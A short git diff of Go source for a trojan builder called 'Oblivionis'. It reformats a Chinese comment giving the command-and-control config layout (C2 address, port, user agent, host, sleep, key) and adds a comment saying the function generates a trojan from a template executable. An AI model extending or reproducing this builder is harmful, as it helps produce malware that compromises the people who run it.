@@ -16,11 +16,8 @@ type OblivionisConfig struct {
 	a         []uint8
 }
 
-/*
-	Config 格式:
-
-|c2addr|c2port|useragent|url|host|sleep|16 bytes A
-*/
+/* Config 格式:
+ * |c2addr|c2port|useragent|url|host|sleep|16 bytes A */
 func (self OblivionisConfig) toData() []uint8 {
 	var buffer bytes.Buffer
 	buffer.WriteString("|" + self.c2addr + "|")
@@ -35,6 +32,8 @@ func (self OblivionisConfig) toData() []uint8 {
 	return buffer.Bytes()
 }
 
+/* 调用此函数来生成使用自定义 config 的木马程序
+ * 参数: config-自定义 config 结构体对象, path-生成的木马程序的保存路径 */
 func GenerateOblivionis(config OblivionisConfig, path string) {
 	configData := config.toData()
 	blank, _ := ioutil.ReadFile("./blank.exe")
